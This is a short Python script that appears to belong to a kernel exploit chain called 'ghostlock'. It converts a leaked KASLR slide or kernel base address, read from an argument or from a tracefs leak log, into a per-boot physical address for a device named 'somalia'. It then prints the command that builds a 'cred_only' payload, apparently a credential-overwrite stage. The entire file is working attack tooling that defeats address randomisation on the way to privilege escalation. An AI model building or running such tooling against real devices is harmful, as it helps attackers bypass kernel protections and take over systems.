#!/usr/bin/env python3
"""Derive somalia per-boot P0 from a tracefs KASLR leak (device formula).

Input: _text base or slide, or a log line containing base=/slide=.
  ./ghostlock_p0_from_slide.py 0xffffffd0803e0000
  ./ghostlock_p0_from_slide.py --slide 0x10003e0000
  ./ghostlock_p0_from_slide.py raw/p2_device/p3_kaslr_leak.txt
"""
import re, sys
KIMAGE_VADDR = 0xffffffc080000000
BASE = 0x80080000

def from_slide(slide: int) -> tuple[int, int]:
    byte = (((slide >> 21) & 3) << 6) | ((((slide & 0x1fffff) - 0x80000) & 0x1fffff) >> 15)
    p0 = BASE + (byte << 15)
    assert 0x80080000 <= p0 <= 0x80878000
    assert (p0 - BASE) % 0x8000 == 0
    return byte, p0

def main() -> int:
    args = sys.argv[1:]
    if not args:
        print(__doc__); return 2
    if args[0] == "--slide":
        slide = int(args[1], 0)
    else:
        text = args[0]
        if text.startswith("0x"):
            slide = int(text, 0) - KIMAGE_VADDR
        else:
            data = open(text, errors="replace").read()
            m = re.search(r"slide[=: ]+(0x[0-9a-fA-F]+)", data)
            b = re.search(r"base[=: ]+(0x[0-9a-fA-F]+)", data)
            if m: slide = int(m.group(1), 0)
            elif b: slide = int(b.group(1), 0) - KIMAGE_VADDR
            else: raise SystemExit("no slide=/base= found")
    byte, p0 = from_slide(slide)
    print(f"slide=0x{slide:016x} byte=0x{byte:02x} P0=0x{p0:08x}")
    print(f"build: ./tools/ghostlock/cred_only/build_so.sh 0x{p0:08x}")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
